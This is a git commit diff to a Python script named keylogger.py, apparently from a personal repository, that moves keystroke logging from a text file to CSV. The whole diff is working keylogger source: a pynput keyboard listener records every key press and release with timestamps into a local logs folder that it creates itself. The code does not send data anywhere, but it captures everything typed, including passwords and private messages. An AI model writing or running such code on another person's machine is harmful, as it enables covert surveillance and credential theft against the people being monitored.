d20ce2d364e4b1401e46e86cdb029a12ab87c7df
niromru <emailr47@gmail.com>
2022-02-10 14:19:21 +0545

    using csv instead of txt

--- keylogger.py
+++ keylogger.py
@@ -1,19 +1,34 @@
 #!/usr/bin/env python3
 
 from pynput import keyboard
-import time
+import time, sys, os, csv
 
-def write_on_file(keys):
-  with open("./logs/logs.txt", "a") as f:
-    print(len(keys))
-    for key in keys:
-      f.write("{} ".format(key))
-    f.write("\n")
+def read_lines(file="./logs/logs.csv"):
+  with open(file, "r") as f:
+    return f.readlines()
+
+def create_csv(file="./logs/logs.csv"):
+  anchor_values = ["condition", "key", "time"]
+  with open(file, "w") as f:
+    csv.writer(f).writerow(anchor_values)
+
+def check():
+  path = os.path.abspath(__file__).split("/")[0:-1]
+  if os.getcwd() != "/".join(path):
+    os.chdir(os.path.dirname(sys.argv[0]))
+  if "logs" not in os.listdir():
+    os.mkdir("logs")
+    create_csv()
+  elif "logs.csv" not in os.listdir("logs") or len(read_lines()) == 0:
+    create_csv()
+
+def write_on_file(keys, file="./logs/logs.csv"):
+  with open(file, "a") as f:
+    csv.writer(f).writerow(keys)
 
 def time_now():
   c_time = time.ctime().split(" ")[1:6]
-  del c_time[1]
-  return c_time
+  return " ".join(c_time)
 
 def on_press(key):
   keys = []
@@ -37,5 +52,13 @@ def on_release(key):
   keys.append(time_now())
   write_on_file(keys)
 
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-  listener.join()
+def kb_listener():
+  with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+def main():
+  check()
+  kb_listener()
+
+if __name__ == "__main__":
+  main()
